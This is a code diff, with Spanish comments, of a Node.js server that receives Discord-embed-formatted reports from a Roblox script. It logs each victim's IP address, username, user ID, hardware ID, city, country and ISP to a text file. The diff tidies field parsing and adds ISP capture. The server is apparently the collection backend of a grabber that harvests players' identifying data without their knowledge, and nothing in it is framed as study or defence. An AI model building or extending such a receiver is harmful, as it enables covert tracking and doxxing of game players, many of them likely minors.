@@ -2,6 +2,7 @@ const http = require('http');
 const fs = require('fs');
 
 const server = http.createServer((req, res) => {
+    // Cabeceras CORS para permitir conexiones externas
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -24,43 +25,27 @@ const server = http.createServer((req, res) => {
                 const data = JSON.parse(body);
                 const timestamp = new Date().toISOString();
                 
-                let ip = "N/A";
-                let username = "N/A";
-                let userid = "N/A";
-                let hwid = "N/A";
-                let city = "N/A";
-                let country = "N/A";
+                let info = {};
 
-                // Si viene en el formato de embeds de Discord del script de Roblox
+                // Extraemos todos los campos del formato Discord Embeds de tu script de Roblox
                 if (data.embeds && data.embeds[0] && data.embeds[0].fields) {
                     data.embeds[0].fields.forEach(field => {
-                        if (field.name === "IP Address") ip = field.value;
-                        if (field.name === "Username") username = field.value;
-                        if (field.name === "User ID") userid = field.value;
-                        if (field.name === "HWID") hwid = field.value;
-                        if (field.name === "City") city = field.value;
-                        if (field.name === "Country") country = field.value;
+                        info[field.name] = field.value;
                     });
-                } else {
-                    // Si viene en formato plano tradicional
-                    ip = data.ip || "N/A";
-                    username = data.username || "N/A";
-                    userid = data.userid || "N/A";
-                    hwid = data.hwid || "N/A";
-                    city = data.city || "N/A";
-                    country = data.country || "N/A";
                 }
 
-                const logEntry = `[${timestamp}] IP: ${ip} | User: ${username} (ID: ${userid}) | HWID: ${hwid} | Ubicación: ${city}, ${country}\n`;
+                // Armamos la línea de registro con los datos extraídos
+                const logEntry = `[${timestamp}] IP: ${info["IP Address"] || 'N/A'} | User: ${info["Username"] || 'N/A'} (ID: ${info["User ID"] || 'N/A'}) | HWID: ${info["HWID"] || 'N/A'} | Ubicación: ${info["City"] || 'N/A'}, ${info["Country"] || 'N/A'} | ISP: ${info["ISP"] || 'N/A'}\n`;
                 
-                console.log("Registro capturado correctamente:", logEntry);
+                console.log("Nuevo reporte completo guardado:", logEntry);
 
+                // Guardamos en el archivo logs.txt
                 fs.appendFile('logs.txt', logEntry, err => {
                     if (err) console.error("Error al guardar en el archivo:", err);
                 });
 
                 res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ status: "success", message: "Guardado" }));
+                res.end(JSON.stringify({ status: "success", message: "Guardado correctamente" }));
             } catch (e) {
                 console.error("Error al procesar JSON:", e);
                 res.writeHead(400, { 'Content-Type': 'application/json' });
@@ -73,13 +58,8 @@ const server = http.createServer((req, res) => {
     }
 });
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`Servidor activo en el puerto ${PORT}`);
-});
-// Forzar el puerto exacto que te asignó Bot-Hosting
+// Usando tu puerto dinámico asignado por Bot-Hosting
 const PORT = process.env.PORT || 26237;
-
 server.listen(PORT, () => {
     console.log(`Servidor activo en el puerto ${PORT}`);
 });
